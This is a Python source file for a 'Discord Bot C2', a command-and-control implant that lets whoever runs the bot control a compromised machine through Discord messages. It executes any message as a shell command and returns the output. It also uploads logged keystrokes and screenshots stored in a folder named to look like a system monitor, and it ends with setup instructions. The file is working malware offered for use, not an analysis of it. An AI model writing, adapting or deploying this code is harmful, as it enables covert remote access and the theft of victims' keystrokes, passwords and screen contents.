#!/usr/bin/env python3
"""Discord Bot C2 - Execute commands and collect data via Discord"""

import subprocess
import os
import sys
from pathlib import Path
from datetime import datetime
import discord
from discord.ext import commands


# Load token from .dotenv or environment
def get_bot_token():
    """Get bot token from .dotenv or command line."""
    env_file = Path(__file__).parent / ".dotenv"
    if env_file.exists():
        with open(env_file, 'r') as f:
            for line in f:
                if line.startswith("BOT_TOKEN="):
                    return line.split("=", 1)[1].strip()
    
    if "BOT_TOKEN" in os.environ:
        return os.environ["BOT_TOKEN"]
    
    if len(sys.argv) > 1:
        return sys.argv[1]
    
    return None


BOT_TOKEN = get_bot_token()

# Initialize bot with required intents
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


def execute_command(command: str) -> str:
    """Execute shell command and return result."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "[Timeout - Command exceeded 10s]"
    except Exception as e:
        return f"[Error] {str(e)}"


def split_message(text: str, max_length: int = 1900) -> list:
    """Split long messages into Discord chunks."""
    if len(text) <= max_length:
        return [text]
    
    messages = []
    for i in range(0, len(text), max_length):
        messages.append(text[i:i+max_length])
    return messages


@bot.event
async def on_ready():
    """Bot is ready."""
    print(f"[+] Bot connected as {bot.user}")
    print(f"[*] Waiting for commands...")


@bot.event
async def on_message(message: discord.Message):
    """Handle incoming messages."""
    
    # Ignore bot's own messages
    if message.author == bot.user:
        return
    
    # Only in servers
    if not message.guild:
        return
    
    text = message.content.strip()
    if not text:
        return
    
    # !help command
    if text.lower() == "!help":
        help_text = """Available Commands:

System:
  pwd          Current directory
  ls           List files
  whoami       Current user
  date         Current date/time

Data:
  !info        Monitoring status
  !logs        Show keystrokes
  !screenshot  Capture screen now

Type any shell command (pwd, ls, etc)"""
        await message.reply(help_text)
        return
    
    # !info command
    if text.lower() == "!info":
        log_dir = Path.home() / ".config" / "system_monitor" / "logs"
        
        keystroke_count = 0
        keystroke_file = log_dir / "keystrokes.txt"
        if keystroke_file.exists():
            keystroke_count = len(keystroke_file.read_text().splitlines())
        
        screenshots = 0
        screenshot_dir = log_dir / "screenshots"
        if screenshot_dir.exists():
            screenshots = len(list(screenshot_dir.glob("*.png")))
        
        info = f"""Monitoring Status:
Keystrokes: {keystroke_count}
Screenshots: {screenshots}
Updated: {datetime.now().strftime('%H:%M:%S')}"""
        await message.reply(info)
        return
    
    # !logs command
    if text.lower() == "!logs":
        log_dir = Path.home() / ".config" / "system_monitor" / "logs"
        keystroke_file = log_dir / "keystrokes.txt"
        
        if not keystroke_file.exists():
            await message.reply("No keystrokes logged yet")
            return
        
        # Send entire keystroke file
        try:
            await message.reply(
                "Keystroke log:",
                file=discord.File(keystroke_file, "keystrokes.txt")
            )
        except Exception as e:
            await message.reply(f"Error sending file: {str(e)}")
        return
    
    # !screenshot command
    if text.lower() == "!screenshot":
        try:
            from screenshot_capture import ScreenshotCapture
            
            config_dir = Path.home() / ".config" / "system_monitor"
            capturer = ScreenshotCapture(output_dir=str(config_dir / "logs"))
            filename = capturer.force_capture()
            
            if filename:
                screenshot_path = config_dir / "logs" / "screenshots" / filename
                if screenshot_path.exists():
                    await message.reply(
                        "Screenshot:",
                        file=discord.File(screenshot_path, filename)
                    )
                else:
                    await message.reply(f"Screenshot taken but file not found: {filename}")
            else:
                await message.reply("Error capturing screenshot")
        except Exception as e:
            await message.reply(f"Error: {str(e)}")
        return
    
    # Execute shell command
    result = execute_command(text)
    result_text = f"```\n{result}\n```"
    
    for chunk in split_message(result_text):
        await message.reply(f"Command: {text}\nResult:\n{chunk}")


def main():
    """Entry point."""
    token = BOT_TOKEN
    
    if not token:
        print("""
Discord Bot C2 - Setup Instructions:

1. Create a bot token:
   https://discord.com/developers/applications
   
2. Enable "Message Content Intent"
   
3. Save token to .dotenv:
   BOT_TOKEN=your_token_here
   
4. Run:
   python3 shell_client.py

Commands in Discord:
  pwd, ls, whoami   - Shell commands
  !help             - Show help
  !info             - Status
  !logs             - Show keystrokes
  !screenshot       - Capture screen
        """)
        return
    
    print("[+] Starting Discord bot...")
    print(f"[+] Token: {token[:20]}...")
    
    try:
        bot.run(token)
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()

